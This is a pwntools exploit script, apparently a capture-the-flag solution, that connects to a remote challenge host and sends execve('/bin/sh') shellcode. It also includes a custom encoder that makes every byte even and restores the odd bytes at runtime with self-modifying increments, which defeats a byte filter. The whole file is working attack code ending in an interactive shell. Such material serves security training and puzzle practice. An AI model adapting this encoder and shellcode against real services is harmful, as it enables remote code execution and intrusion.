from pwn import *

#target = process('./two')

#pid = gdb.attach(target, "\nb *main+363\n set disassembly-flavor intel\ncontinue")

target = remote('host1.metaproblems.com', 5480)

print(target.recvuntil(b'What is your shellcode?'))

context.clear(arch='amd64')

def encode(goal_shellcode, starting_position, binsh_position):
	evened_shellcode = b''
	encoder_shellcode = b''
	current_position = starting_position
	for i in range(len(goal_shellcode)):
		current_byte_num = goal_shellcode[i]
		if current_byte_num % 2 == 1:
			evened_shellcode += (current_byte_num - 1).to_bytes(1, 'little')
			if current_position % 2 == 0:
				encoder_shellcode += asm('mov al, ' + str(current_position) + ''';
				inc BYTE PTR ds:[rax];''')
			else:
				encoder_shellcode += asm('mov al, ' + str(current_position - 1) + ''';
				inc al;
				inc BYTE PTR ds:[rax];''')
			
		else:
			evened_shellcode += goal_shellcode[i].to_bytes(1, 'little')
		current_position += 1
	final_shellcode = encoder_shellcode + asm('NOP;') * (starting_position - len(encoder_shellcode)) + evened_shellcode
	return final_shellcode


starting_position = 0x80
binsh_position = 0xf6
goal_shellcode = asm('add rdi, '+ str(binsh_position) + ''';
xor esi, esi;
xor rdx, rdx;
xor rax, rax;
mov al, 59;
syscall;
''') 
goal_shellcode += asm('NOP') * (binsh_position - starting_position  - len(goal_shellcode)) + b'/bin/sh\x00'

shellcode = encode(goal_shellcode, starting_position, binsh_position)


print(shellcode)
print(disasm(shellcode))

target.sendline(shellcode)

target.interactive()
